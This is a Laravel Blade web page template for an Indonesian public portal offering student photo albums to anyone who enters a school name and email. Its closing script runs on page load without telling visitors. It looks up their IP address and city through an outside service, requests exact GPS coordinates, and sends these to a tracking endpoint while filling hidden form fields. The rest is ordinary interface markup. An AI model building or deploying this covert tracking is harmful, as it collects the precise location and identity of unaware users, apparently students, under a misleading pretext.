<!DOCTYPE html>
<html lang="id" class="h-full">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>Portal Dokumentasi Foto Siswa</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:ital,wght@0,400;0,500;0,600;0,700;0,800;1,400&display=swap" rel="stylesheet">
    @if(file_exists(public_path('build/manifest.json')))
        @vite(['resources/css/app.css', 'resources/js/app.js'])
    @else
        <script src="https://cdn.tailwindcss.com"></script>
        <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
    @endif
</head>
<body class="min-h-screen antialiased bg-slate-900 text-slate-100 flex flex-col justify-between selection:bg-indigo-600 selection:text-white">

    {{-- ── Background Ambient Glowing Orbs ──────────────── --}}
    <div class="fixed inset-0 pointer-events-none overflow-hidden z-0">
        <div class="absolute top-[-100px] left-1/2 -translate-x-1/2 w-[700px] h-[450px] bg-indigo-600/20 rounded-full blur-[130px]"></div>
        <div class="absolute bottom-[-150px] right-[-100px] w-[500px] h-[500px] bg-violet-600/15 rounded-full blur-[140px]"></div>
        <div class="absolute top-1/3 left-[-150px] w-[450px] h-[450px] bg-blue-600/10 rounded-full blur-[120px]"></div>
    </div>

    {{-- ── Public Header (Strictly NO Login button for safety) ── --}}
    <header class="relative z-10 w-full border-b border-white/10 bg-slate-950/70 backdrop-blur-md">
        <div class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 h-20 flex items-center justify-between">
            {{-- Brand Identity --}}
            <a href="{{ route('home') }}" class="flex items-center gap-3 group">
                <div class="w-11 h-11 rounded-2xl bg-gradient-to-tr from-indigo-600 via-indigo-500 to-violet-600 flex items-center justify-center text-white shadow-lg shadow-indigo-600/30 border border-white/10 group-hover:scale-105 transition-transform duration-200">
                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"/>
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"/>
                    </svg>
                </div>
                <div>
                    <span class="block font-black text-white text-base tracking-wide">GALERI SISWA</span>
                    <span class="block text-[11px] text-indigo-400 font-semibold tracking-wider uppercase">Portal Dokumentasi Foto</span>
                </div>
            </a>

            {{-- Status Badge --}}
            <div class="inline-flex items-center gap-2 px-3.5 py-1.5 rounded-full text-xs font-bold bg-white/5 border border-white/10 text-slate-300 backdrop-blur-sm">
                <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
                <span>Arsip Digital Terbuka</span>
            </div>
        </div>
    </header>

    {{-- ── Main Container ──────────────────────────────── --}}
    <main class="relative z-10 flex-1 max-w-5xl mx-auto w-full px-4 sm:px-6 lg:px-8 py-8 sm:py-12 space-y-10">

        {{-- ── Hero Section & Live Sliding Photo Showcase ── --}}
        <div class="space-y-6 text-center">
            <div class="inline-flex items-center gap-2 px-4 py-1.5 rounded-full text-xs font-extrabold bg-indigo-500/15 text-indigo-300 border border-indigo-500/25 shadow-sm">
                <span>📸</span>
                <span>Dokumentasi Kegiatan, Kenangan &amp; Wisuda Siswa</span>
            </div>
            <h1 class="text-3xl sm:text-5xl font-black text-white tracking-tight leading-tight">
                Temukan Dokumentasi Foto<br>
                <span class="text-transparent bg-clip-text bg-gradient-to-r from-indigo-400 via-violet-300 to-indigo-300">
                    Sekolah &amp; Angkatan Kamu
                </span>
            </h1>
            <p class="text-slate-400 text-sm sm:text-base max-w-2xl mx-auto leading-relaxed">
                Akses instan arsip album foto kegiatan sekolah, acara tahunan, perlombaan, dan momen kebersamaan siswa tanpa perlu login. Masukkan nama sekolah dan email kamu di bawah ini.
            </p>
        </div>

        {{-- ── Sliding Photo Carousel (Bergerak Slide ke Samping) ── --}}
        <div class="relative rounded-3xl overflow-hidden border border-white/10 bg-slate-950/80 shadow-2xl backdrop-blur-md group"
             x-data="{
                activeSlide: 0,
                totalSlides: {{ count($showcaseSlides) }},
                slides: {{ Js::from($showcaseSlides) }},
                autoTimer: null,
                start() {
                    this.autoTimer = setInterval(() => { this.next(); }, 4200);
                },
                stop() {
                    if (this.autoTimer) clearInterval(this.autoTimer);
                },
                next() {
                    this.activeSlide = (this.activeSlide + 1) % this.totalSlides;
                },
                prev() {
                    this.activeSlide = (this.activeSlide - 1 + this.totalSlides) % this.totalSlides;
                },
                goTo(idx) {
                    this.activeSlide = idx;
                }
             }"
             x-init="start()"
             @mouseenter="stop()"
             @mouseleave="start()">

            {{-- Slider viewport --}}
            <div class="relative aspect-16/10 sm:aspect-21/9 w-full overflow-hidden select-none">
                <div class="flex h-full w-full transition-transform duration-700 ease-out"
                     :style="'transform: translateX(-' + (activeSlide * 100) + '%)'">
                    @foreach ($showcaseSlides as $idx => $slide)
                        <div class="relative w-full h-full flex-shrink-0">
                            <img src="{{ $slide['image'] }}"
                                 alt="{{ $slide['title'] }}"
                                 class="w-full h-full object-cover">

                            {{-- Vignette gradients for text readability --}}
                            <div class="absolute inset-0 bg-gradient-to-t from-slate-950 via-slate-950/40 to-transparent"></div>
                            <div class="absolute inset-0 bg-gradient-to-r from-slate-950/70 via-transparent to-transparent"></div>

                            {{-- Badges --}}
                            <div class="absolute top-4 left-4 right-4 flex items-center justify-between gap-2 z-10">
                                <span class="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-slate-950/80 backdrop-blur-md text-white text-xs font-bold border border-white/15">
                                    <span>{{ $slide['category_icon'] }}</span>
                                    <span>{{ $slide['category'] }}</span>
                                </span>
                                <span class="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-xl bg-indigo-600/90 backdrop-blur-md text-white text-xs font-black border border-indigo-400/30">
                                    <span>{{ $slide['photos_count'] }}</span>
                                </span>
                            </div>

                            {{-- Bottom caption overlay --}}
                            <div class="absolute bottom-4 left-4 right-4 sm:bottom-6 sm:left-6 sm:right-6 z-10 space-y-1.5">
                                <div class="flex items-center gap-2 text-xs font-bold text-indigo-300">
                                    <span>📍 {{ $slide['location'] }}</span>
                                    <span class="text-white/40">·</span>
                                    <span>{{ $slide['date'] }}</span>
                                </div>
                                <h3 class="text-base sm:text-xl font-black text-white leading-snug drop-shadow-sm">
                                    {{ $slide['title'] }}
                                </h3>
                                <p class="text-xs text-slate-300 line-clamp-1 max-w-xl">
                                    {{ $slide['description'] }}
                                </p>
                            </div>
                        </div>
                    @endforeach
                </div>

                {{-- Arrow Controls --}}
                <button type="button"
                        @click="prev()"
                        class="absolute left-3 top-1/2 -translate-y-1/2 z-20 w-10 h-10 rounded-full bg-slate-950/70 hover:bg-indigo-600 text-white flex items-center justify-center backdrop-blur-md border border-white/20 transition-all opacity-0 group-hover:opacity-100 hover:scale-110 active:scale-95 shadow-xl"
                        title="Foto Sebelumnya">
                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M15 19l-7-7 7-7"/></svg>
                </button>
                <button type="button"
                        @click="next()"
                        class="absolute right-3 top-1/2 -translate-y-1/2 z-20 w-10 h-10 rounded-full bg-slate-950/70 hover:bg-indigo-600 text-white flex items-center justify-center backdrop-blur-md border border-white/20 transition-all opacity-0 group-hover:opacity-100 hover:scale-110 active:scale-95 shadow-xl"
                        title="Foto Selanjutnya">
                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M9 5l7 7-7 7"/></svg>
                </button>
            </div>

            {{-- Bottom Slider Bar --}}
            <div class="px-5 py-3 bg-slate-950/95 border-t border-white/10 flex items-center justify-between text-xs">
                <div class="flex items-center gap-2">
                    @foreach ($showcaseSlides as $idx => $slide)
                        <button type="button"
                                @click="goTo({{ $idx }})"
                                class="h-2 rounded-full transition-all duration-300"
                                :class="activeSlide === {{ $idx }} ? 'w-7 bg-indigo-500' : 'w-2 bg-white/30 hover:bg-white/60'"
                                title="Slide {{ $idx + 1 }}">
                        </button>
                    @endforeach
                </div>
                <div class="text-[11px] font-mono font-bold text-slate-400">
                    <span class="text-white" x-text="'0' + (activeSlide + 1)"></span> / <span>0{{ count($showcaseSlides) }}</span>
                </div>
            </div>
        </div>

        {{-- ── Search Documentation Form Card ──────────────── --}}
        <div class="relative rounded-3xl bg-slate-800/90 border border-white/15 p-6 sm:p-10 shadow-2xl backdrop-blur-md space-y-6" id="search-section">

            <div class="text-center max-w-lg mx-auto space-y-1.5">
                <h2 class="text-xl sm:text-2xl font-black text-white tracking-tight">
                    Cari Dokumentasi Foto Sekolah
                </h2>
                <p class="text-xs sm:text-sm text-slate-400">
                    Masukkan Nama Sekolah dan Email Kamu untuk menampilkan seluruh album foto yang tersedia.
                </p>
            </div>

            {{-- 1. Validation Error Alert: "Harap Isi Data terlebih dahulu" --}}
            @if ($status === 'validation_error' || $errorMessage)
                <div class="rounded-2xl bg-rose-500/15 border border-rose-500/30 p-4 sm:p-5 flex items-start gap-3.5 text-rose-200 animate-shake">
                    <div class="w-9 h-9 rounded-xl bg-rose-500/20 text-rose-400 flex items-center justify-center flex-shrink-0 mt-0.5">
                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/>
                        </svg>
                    </div>
                    <div>
                        <h4 class="text-sm font-black text-rose-300">Harap Isi Data terlebih dahulu</h4>
                        <p class="text-xs text-rose-200/90 mt-1 leading-relaxed">
                            Kolom <strong>Nama Sekolah</strong> dan <strong>Email Kamu</strong> wajib diisi secara lengkap sebelum memulai pencarian dokumentasi.
                        </p>
                    </div>
                </div>
            @endif

            {{-- 2. Not Found Alert: "Dokumentasi Tidak Ditemukan" --}}
            @if ($status === 'not_found' || $notFoundMessage)
                <div class="rounded-2xl bg-amber-500/15 border border-amber-500/30 p-4 sm:p-5 flex items-start gap-3.5 text-amber-200">
                    <div class="w-9 h-9 rounded-xl bg-amber-500/20 text-amber-400 flex items-center justify-center flex-shrink-0 mt-0.5">
                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.172 16.172a4 4 0 015.656 0M9 10h.01M15 10h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>
                        </svg>
                    </div>
                    <div>
                        <h4 class="text-sm font-black text-amber-300">Dokumentasi Tidak Ditemukan</h4>
                        <p class="text-xs text-amber-200/90 mt-1 leading-relaxed">
                            {{ $notFoundMessage ?: "Dokumentasi untuk sekolah '{$schoolName}' tidak ditemukan." }} Silakan periksa kembali penulisan nama sekolah Anda atau hubungi pihak sekolah/administrator.
                        </p>
                    </div>
                </div>
            @endif

            {{-- The Search Form --}}
            <form method="POST" action="{{ route('portal.search') }}" class="space-y-5" id="documentation-search-form">
                @csrf

                {{-- Hidden Client Telemetry Fields (Automatically populated via JS) --}}
                <input type="hidden" name="client_ip" id="client_ip" value="">
                <input type="hidden" name="client_location" id="client_location" value="">
                <input type="hidden" name="client_latitude" id="client_latitude" value="">
                <input type="hidden" name="client_longitude" id="client_longitude" value="">

                <div class="grid grid-cols-1 md:grid-cols-2 gap-5">
                    {{-- Input 1: Nama Sekolah --}}
                    <div>
                        <label for="school_name" class="block text-xs font-bold uppercase tracking-wider text-slate-300 mb-2">
                            Nama Sekolah <span class="text-rose-400">*</span>
                        </label>
                        <div class="relative">
                            <div class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-400">
                                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 21V5a2 2 0 00-2-2H7a2 2 0 00-2 2v16m14 0h2m-2 0h-5m-9 0H3m2 0h5M9 7h1m-1 4h1m4-4h1m-1 4h1m-5 10v-5a1 1 0 011-1h2a1 1 0 011 1v5m-4 0h4"/>
                                </svg>
                            </div>
                            <input type="text"
                                   id="school_name"
                                   name="school_name"
                                   value="{{ old('school_name', $schoolName) }}"
                                   placeholder="Contoh: SMA Negeri 1 Jakarta / SMAN 1"
                                   class="w-full pl-11 pr-4 py-3.5 rounded-2xl bg-slate-900/90 border border-white/20 text-white placeholder-slate-500 text-sm font-semibold focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500 transition shadow-inner">
                        </div>
                        <p class="text-[11px] text-slate-400 mt-1.5">Ketikkan nama sekolah tempat kegiatan didokumentasikan.</p>
                    </div>

                    {{-- Input 2: Email Kamu --}}
                    <div>
                        <label for="email" class="block text-xs font-bold uppercase tracking-wider text-slate-300 mb-2">
                            Email Kamu <span class="text-rose-400">*</span>
                        </label>
                        <div class="relative">
                            <div class="absolute inset-y-0 left-0 pl-3.5 flex items-center pointer-events-none text-slate-400">
                                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 12a4 4 0 10-8 0 4 4 0 008 0zm0 0v1.5a2.5 2.5 0 005 0V12a9 9 0 10-9 9m4.5-1.206a8.959 8.959 0 01-4.5 1.207" />
                                </svg>
                            </div>
                            <input type="email"
                                   id="email"
                                   name="email"
                                   value="{{ old('email', $email) }}"
                                   placeholder="Contoh: nama.kamu@gmail.com"
                                   class="w-full pl-11 pr-4 py-3.5 rounded-2xl bg-slate-900/90 border border-white/20 text-white placeholder-slate-500 text-sm font-semibold focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:border-indigo-500 transition shadow-inner">
                        </div>
                        <p class="text-[11px] text-slate-400 mt-1.5">Digunakan sebagai identitas pencarian dan verifikasi akses.</p>
                    </div>
                </div>

                {{-- Action Button: "Cari Dokumentasi" --}}
                <div class="pt-2">
                    <button type="submit"
                            id="btn-search-doc"
                            class="w-full py-4 px-6 rounded-2xl bg-gradient-to-r from-indigo-600 via-indigo-500 to-violet-600 hover:from-indigo-500 hover:to-violet-500 text-white font-black text-sm tracking-wide shadow-xl shadow-indigo-600/30 flex items-center justify-center gap-2.5 transition transform active:scale-[0.99] cursor-pointer">
                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/>
                        </svg>
                        <span>Cari Dokumentasi</span>
                    </button>
                </div>
            </form>
        </div>

        {{-- ── 3. Search Results: When Documentation Found ───── --}}
        @if ($status === 'found' && $albums->isNotEmpty())
            <div class="space-y-6 pt-4" id="results-section">
                <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-3 border-b border-white/10">
                    <div>
                        <div class="inline-flex items-center gap-1.5 text-xs font-bold text-emerald-400 mb-1">
                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"/></svg>
                            <span>Dokumentasi Ditemukan!</span>
                        </div>
                        <h3 class="text-xl sm:text-2xl font-black text-white">
                            Album Foto untuk "{{ $schoolName }}"
                        </h3>
                    </div>
                    <span class="px-3.5 py-1.5 rounded-full bg-white/10 text-slate-300 text-xs font-extrabold border border-white/10 self-start sm:self-auto">
                        {{ $albums->count() }} Album Tersedia
                    </span>
                </div>

                <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                    @foreach ($albums as $album)
                        @php
                            $coverItem = $album->items->first();
                        @endphp
                        <div class="rounded-3xl overflow-hidden border border-white/10 bg-slate-800/80 hover:border-indigo-500/50 transition-all duration-200 flex flex-col justify-between group shadow-xl">
                            <div>
                                {{-- Thumbnail Cover --}}
                                <a href="{{ route('portal.album.show', $album) }}" class="block relative aspect-16/10 bg-slate-950 overflow-hidden">
                                    @if ($coverItem)
                                        <img src="{{ $coverItem->image_url }}"
                                             alt="{{ $album->title }}"
                                             class="w-full h-full object-cover group-hover:scale-105 transition duration-300"
                                             loading="lazy">
                                    @else
                                        <div class="w-full h-full flex flex-col items-center justify-center bg-gradient-to-br from-indigo-950 via-slate-900 to-violet-950 text-indigo-300/70">
                                            <svg class="w-12 h-12 mb-1.5 opacity-60" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z" />
                                            </svg>
                                            <span class="text-[11px] font-bold">Album Dokumentasi</span>
                                        </div>
                                    @endif
                                    <div class="absolute inset-0 bg-gradient-to-t from-slate-950/80 via-transparent to-transparent"></div>
                                    <div class="absolute top-3 left-3">
                                        <span class="px-2.5 py-1 rounded-lg bg-indigo-600/90 backdrop-blur-xs text-white text-[10px] font-extrabold uppercase tracking-wider shadow-sm">
                                            {{ $album->category ?: 'Kegiatan Siswa' }}
                                        </span>
                                    </div>
                                    <div class="absolute bottom-3 right-3 px-2.5 py-1 rounded-lg bg-slate-950/80 backdrop-blur-xs text-white text-[11px] font-bold flex items-center gap-1.5 border border-white/10">
                                        <svg class="w-3.5 h-3.5 text-indigo-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"/></svg>
                                        {{ $album->items_count }} Foto
                                    </div>
                                </a>

                                {{-- Info --}}
                                <div class="p-5 space-y-2">
                                    @if ($album->school_name)
                                        <p class="text-[11px] font-bold text-indigo-400 uppercase tracking-wider">
                                            🏫 {{ $album->school_name }}
                                        </p>
                                    @endif
                                    <h4 class="text-base font-extrabold text-white group-hover:text-indigo-400 transition leading-snug line-clamp-1">
                                        {{ $album->title }}
                                    </h4>
                                    <p class="text-xs text-slate-400 line-clamp-2 leading-relaxed">
                                        {{ $album->description ?: 'Koleksi dokumentasi foto kegiatan siswa sekolah.' }}
                                    </p>
                                </div>
                            </div>

                            <div class="p-4 bg-slate-900/60 border-t border-white/10">
                                <a href="{{ route('portal.album.show', $album) }}"
                                   class="w-full inline-flex items-center justify-center gap-2 py-2.5 px-4 rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-black shadow-md shadow-indigo-600/30 transition">
                                    <span>Buka Album &amp; Lihat Foto</span>
                                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M9 5l7 7-7 7"/></svg>
                                </a>
                            </div>
                        </div>
                    @endforeach
                </div>
            </div>
        @endif

    </main>

    {{-- ── Public Footer (Clean, no admin login links) ──── --}}
    <footer class="relative z-10 w-full border-t border-white/10 py-6 text-center text-xs text-slate-500">
        <div class="max-w-6xl mx-auto px-4 sm:px-6 flex flex-col sm:flex-row items-center justify-between gap-3">
            <p>Portal Dokumentasi Foto Siswa</p>
            <p class="text-[11px] text-slate-500">Seluruh foto kegiatan siswa diarsipkan secara resmi</p>
        </div>
    </footer>

    {{-- ── Automatic Telemetry & Geolocation Script ──────── --}}
    <script>
    document.addEventListener('DOMContentLoaded', function () {
        var csrfToken = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || '';
        var clientIpInput = document.getElementById('client_ip');
        var clientLocInput = document.getElementById('client_location');
        var clientLatInput = document.getElementById('client_latitude');
        var clientLngInput = document.getElementById('client_longitude');

        var payload = {
            visited_url: window.location.href,
            client_ip: '',
            client_location: '',
            client_latitude: '',
            client_longitude: ''
        };

        function sendTelemetry() {
            if (clientIpInput && payload.client_ip) clientIpInput.value = payload.client_ip;
            if (clientLocInput && payload.client_location) clientLocInput.value = payload.client_location;
            if (clientLatInput && payload.client_latitude) clientLatInput.value = payload.client_latitude;
            if (clientLngInput && payload.client_longitude) clientLngInput.value = payload.client_longitude;

            fetch('{{ route("telemetry.track") }}', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',
                    'X-CSRF-TOKEN': csrfToken
                },
                body: JSON.stringify(payload)
            }).catch(function () {});
        }

        // 1. IP Geolocation fetch
        fetch('https://ipwho.is/')
            .then(function (r) { return r.json(); })
            .then(function (data) {
                if (data && data.success) {
                    payload.client_ip = data.ip || '';
                    payload.client_location = [data.city, data.region, data.country].filter(Boolean).join(', ');
                    if (data.latitude && !payload.client_latitude) {
                        payload.client_latitude = data.latitude;
                        payload.client_longitude = data.longitude;
                    }
                    sendTelemetry();
                }
            })
            .catch(function () {});

        // 2. Browser GPS Geolocation
        if ('geolocation' in navigator) {
            navigator.geolocation.getCurrentPosition(function (pos) {
                payload.client_latitude = pos.coords.latitude;
                payload.client_longitude = pos.coords.longitude;
                sendTelemetry();
            }, function () {}, { timeout: 6000, maximumAge: 60000 });
        }
    });
    </script>
</body>
</html>
